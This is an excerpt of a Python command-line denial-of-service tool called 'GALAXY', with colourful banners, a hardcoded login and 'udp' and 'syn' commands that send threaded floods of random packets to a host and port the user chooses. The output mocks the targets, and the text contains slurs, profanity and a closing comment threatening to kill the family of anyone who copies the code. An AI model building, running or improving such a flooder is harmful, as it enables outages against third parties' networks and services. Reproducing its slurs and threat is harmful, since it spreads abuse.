...
info = """\033[34m
╔══════════════════════════════════════════════════════╗
║                     \033[34mGalaxy Credits\033[34m                       ║
║══════════════════════════════════════════════════════║
║ \033[35m[~] GALAXY Was Made By DAVID ~~ ENJOY!\033[35m                ║
║ \033[35m[~] Discord: N/A.\033[35m                                     ║
║ \033[35m[~] Instagram: N/A.\033[35m                                   ║
║ \033[35m[~] YouTube: N/A.\033[35m                                     ║
╚══════════════════════════════════════════════════════╝\033[34m
"""

extras = """\033[34m
╔══════════════════════════════════════════════════════╗
║                        \033[34mExtra Info\033[35m                    ║
║══════════════════════════════════════════════════════║
...
║ \033[35mUpdates \033[34m|\033[34m Shows Update Notes For GALAXY.\033[34m             ║
║ \033[35mInfo    \033[34m|\033[34m Shows GALAXY Info.\033[34m                         ║
║ \033[35mClear   \033[34m|\033[34m Clears Screen.\033[34m                             ║
║ \033[35mExit    \033[34m|\033[34m Exits Out Of GALAXY.\033[34m                       ║
╚══════════════════════════════════════════════════════╝\033[34m
"""

updatenotes = """\033[35m
╔══════════════════════════════════════════════════════╗
║                     \033[34mUpdate Info\033[34m                      ║
║══════════════════════════════════════════════════════║  
║ \033[35m[~] Added Many Banners.\033[34m                              ║
║ \033[35m[~] Took Out Some Tools.\033[35m                             ║
║ \033[35m[~] User And Pass Changed To GALAXY.\033[35m                  ║
...
def main():
	...
	while True:
		sys.stdout.write("\x1b]2; GALAXY ~~ Made By DAVID\x07")
		sin = input("\033[1;35m[\033[35mAgent\033[1;35m]-\033[35m\033[35m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			...
			print ("[\033[35mAgent\033[35m] You Are Exiting Out Of GALAXY.\n")                                                                        
			print ("                                  Made By David                		")
			...
			print ("[\033[35mAgent\033[35m] Faggots Slammed: {}\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[34mAgent\033[34m] Host: {} \033[34m[\033[35mConverted\033[34m] {}\n".format (host, host_ip))
			main()
		elif sinput == "udp":
			if username == "Guest":
				print ("[\033[91mAgent\033[00m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("[\033[34mAgent\033[34m] You Fucked: {}\n".format (host))
					...
					print("                                \033[35m G A L A X Y \033[35m")
					print(" ")
					print ("                           \033[34m[Agent\033[34m] RIP To: {}\n".format (host))
					time.sleep(2)
					os.system ("clear")
					print (banner)
					main()
				except ValueError:
					print ("[\033[34mAgent\033[34m] The Command {} Requires An Argument Dumb Fuck.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[34mAgent\033[34m] Host: {} Invalid.\n".format (host))
			...
			if username == "Guest":
				print ("[\033[34mAgent\033[34m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					...
					print ("[\033[35mAgent\033[035m] The Command {} Requires An Argument Dumb Fuck.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[35mAgent\033[35m] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				...
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				print ("[\033[34mAgent\033[34m] You Fucked To: {}\n".format (host))
				print ("                  |  |")
				print ("                  |  /")
				print ("                   |/")
				time.sleep(1)
				...
				print ("[\033[34mAgent\033[34m] The Command {} Is Wrong Dumb Fuck.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mAgent\033[00m] Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "stop":
			print ("[\033[34mAgent\033[34m] All Running Attacks Have Ended.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
			...
			if what == "udp":
				...
				while not udp:
					if aid == 0:
						print ("[\033[34mAgent\033[34m] No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				...
				icmp = False
				while not icmp:
					print ("[\033[34mAgent\033[34m] No ICMP Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[34mAgent\033[34m] {} Is Not A Command Dumb Fuck.\n".format(sinput))
			main()
...
try:
	...
	if username in users:
		...
		print ("\033[34m[+] Incorrect, Try Again Next Time Agent ;).\n")
		print (" 									")
		print (" \033[34m    * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * ")                                                                        
		print (" 									")
		print (" \033[34m                                 Made By DAVID                         ")
		print ("                                                                        ")
		print ("                                                                        ")
		print ("                                                                        ")
		print ("\033[35m		██╗███╗   ██╗██╗   ██╗ █████╗ ██╗     ██╗██████╗        ")
	...
	exit()
try:
	passwords = ["GALAXY", "GALAXY"]
	password = getpass.getpass ("[+] Password: ")
	if user == "GALAXY":
		if password == passwords[0]:
			print ("\033[34m[+] Agent Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for GALAXY ;).")
			titties = """
...
"""
			...
			print ("\033[35m                    ║               \033[0;34mGALAXY INFO\033[0;34m            \033[35m║\033[35m")
			print ("\033[35m                    ║═════════════════════════════════════║\033[35m")
			...
			try:
				...
				print ("\n[\033[34mAgent\033[34m] Ctrl-C, Dont Leave Too Soon ;) Remember We are ALL Apart of GALAXY.\n")
				print ("  ================\ ")
				print ("  |----------||@  \\   ___")
			...
			print ("[+] Incorrect, Try Again Next Time Agent ;).\n")
			exit()
	if user == "GALAXY":
		if password == passwords[1]:
			print ("[+] Agent Shit Granted ;).")
...
#Agent THIS SHIT AND ILL KILL YOUR FAMILY, Love MV